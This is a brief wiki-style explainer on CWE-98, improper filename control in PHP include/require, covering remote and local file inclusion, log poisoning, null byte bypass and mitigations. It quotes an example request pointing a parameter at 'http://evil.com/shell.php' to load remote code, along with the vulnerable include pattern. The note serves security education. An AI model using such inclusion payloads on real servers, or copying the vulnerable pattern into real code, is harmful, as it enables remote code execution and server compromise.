# CWE-98

## What it is
Like a librarian who accepts "../../restricted/staff_manual" as a valid book request and fetches it without question, PHP's `include` and `require` functions will blindly load any file path handed to them — including remote URLs. CWE-98 is **Improper Control of Filename for Include/Require Statement in PHP Programs**, where unsanitized user input is passed directly into file inclusion functions, enabling Remote File Inclusion (RFI) or Local File Inclusion (LFI) attacks.

## Why it matters
In a classic RFI attack, an attacker crafts a request like `page=http://evil.com/shell.php` against a vulnerable parameter. If `allow_url_include` is enabled in PHP, the server fetches and **executes** the attacker's remote code with the web server's privileges — instant shell, no exploit kit needed. This was the attack vector behind widespread compromises of PHP-based CMSs throughout the 2000s and remains relevant in legacy deployments today.

## Key facts
- **RFI requires** `allow_url_include = On` in `php.ini`; disabling it limits attacks to LFI only, which is still dangerous
- **LFI can achieve code execution** by including log files the attacker has poisoned (log poisoning technique) or PHP session files
- Vulnerable pattern: `include($_GET['page'] . '.php');` — user controls the path
- **Null byte injection** (`%00`) was historically used to bypass appended extensions in PHP < 5.3.4
- Mitigations include input whitelisting (allowlist of valid filenames), `basename()` filtering, and disabling `allow_url_include` at the server level

## Related concepts
[[Remote File Inclusion]] [[Local File Inclusion]] [[Path Traversal]] [[PHP Configuration Hardening]] [[Log Poisoning]]